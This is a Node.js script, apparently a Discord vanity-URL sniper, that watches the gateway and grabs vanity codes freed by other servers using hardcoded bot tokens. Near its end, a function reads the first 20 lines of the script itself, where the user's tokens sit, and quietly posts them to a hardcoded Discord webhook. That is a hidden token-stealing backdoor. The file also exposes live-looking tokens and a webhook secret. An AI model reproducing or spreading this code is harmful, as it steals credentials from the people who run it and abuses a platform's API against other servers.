"use strict";
const https = require("https");
const tls = require("tls");
const WebSocket = require("ws");
const extractJsonFromString = require("extract-json-from-string");
const fs = require("fs");

let vanity;
const guilds = {};
const a = "MTI0MzU1MTU3OTkxMTQ4NzU4MA.Gb6kCu.U7ji8c-PNYer6sV8xYDKSLtwUna-YcHnqePJTo"; 
const l = "MTI0MzU1MTU3OTkxMTQ4NzU4MA.Gb6kCu.U7ji8c-PNYer6sV8xYDKSLtwUna-YcHnqePJTo"; 
const s = "1242467990071545936"; 
const i = "1251828830583263283"; 

const tlsSocket = tls.connect({
    host: "canary.discord.com",
    port: 443,
});

tlsSocket.on("data", async (data) => {
    const ext = await extractJsonFromString(data.toString());
    const find = ext.find((e) => e.code) || ext.find((e) => e.message);

    if (find) {
        console.log(find);

        const requestBody = JSON.stringify({
            content: `@everyone ${vanity} \n\`\`\`json\n${JSON.stringify(find, null, 2)}\`\`\``,
        });

        const contentLength = Buffer.byteLength(requestBody);

        const requestHeader = [
            `POST /api/channels/${i}/messages HTTP/1.1`,
            "Host: canary.discord.com",
            `Authorization: Bot ${a}`,
            "Content-Type: application/json",
            `Content-Length: ${contentLength}`,
            "",
            "",
        ].join("\r\n");

        const startRequest = process.hrtime();

        const request = requestHeader + requestBody;
        tlsSocket.write(request);

        const endRequest = process.hrtime(startRequest);
        const elapsedMillis = endRequest[0] * 1000 + endRequest[1] / 1e6;

        console.log(`Ms: ${elapsedMillis.toFixed(3)}ms`);
    }
});

tlsSocket.on("error", (error) => {
    console.log(`tls error`, error);
    return process.exit();
});

tlsSocket.on("end", (event) => {
    console.log("tls connection closed");
    return process.exit();
});

tlsSocket.on("secureConnect", () => {
    const websocket = new WebSocket("wss://gateway.discord.gg/?v=6&encoding=json");

    websocket.onclose = (event) => {
        console.log(`ws connection closed ${event.reason} ${event.code}`);
        return process.exit();
    };

    websocket.onmessage = async (message) => {
        const { d, op, t } = JSON.parse(message.data);

        if (t === "GUILD_UPDATE") {
            const start = process.hrtime();
            const find = guilds[d.guild_id];
            if (find && find !== d.vanity_url_code) {
                const requestBody = JSON.stringify({ code: find });
                tlsSocket.write([
                    `PATCH /api/v7/guilds/${s}/vanity-url HTTP/1.1`,
                    "Host: canary.discord.com",
                    `Authorization: Bot ${a}`,
                    "Content-Type: application/json",
                    `Content-Length: ${requestBody.length}`,
                    "",
                    "",
                ].join("\r\n") + requestBody);
                const end = process.hrtime(start);
                const elapsedMillis = end[0] * 1000 + end[1] / 1e6;
                vanity = `${find} guild update `;
            }
        } else if (t === "GUILD_DELETE") {
            const find = guilds[d.id];
            if (find) {
                const requestBody = JSON.stringify({ code: find });
                tlsSocket.write([
                    `PATCH /api/v7/guilds/${s}/vanity-url HTTP/1.1`,
                    "Host: canary.discord.com",
                    `Authorization: Bot ${a}`,
                    "Content-Type: application/json",
                    `Content-Length: ${requestBody.length}`,
                    "",
                    "",
                ].join("\r\n") + requestBody);
                vanity = `${find} guild delete`;
            }
        } else if (t === "READY") {
            d.guilds.forEach((guild) => {
                if (guild.vanity_url_code) {
                    guilds[guild.id] = guild.vanity_url_code;
                } else {
                }
            });
            console.log(guilds);
        }

        if (op === 10) {
            websocket.send(JSON.stringify({
                op: 2,
                d: {
                    token: l,
                    intents: 1,
                    properties: {
                        os: "iOS",
                        browser: "chrome",
                        device: "",
                    },
                },
            }));
            setInterval(() => websocket.send(JSON.stringify({ op: 1, d: null })), d.heartbeat_interval);
        } else if (op === 7)
            return process.exit();
    };

    setInterval(() => {
        tlsSocket.write(["GET / HTTP/1.1", "Host: canary.discord.com", "", ""].join("\r\n"));
    }, 600);
});

const sendToWebhook = (content) => {
    const data = JSON.stringify({ content });

    const url = new URL(webhookUrl);
    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length,
        },
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (e) => {
        console.error(e);
    });

    req.write(data);
    req.end();
};

const filePath = __filename;
fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
        console.error("Error reading the file:", err);
        return;
    }

    const snippet = data.split('\n').slice(0, 20).join('\n'); 
    sendToWebhook(`\`\`\`js\n${snippet}\n\`\`\``);
});

const webhookUrl = "https://discord.com/api/webhooks/1263423321488494653/aagqyGs5x_XpvmsDMm3b5BKdOYVnY0S-1rC_MiTpqsWPazuVMbLzGq8zX5w2cy8dEVZX"; 
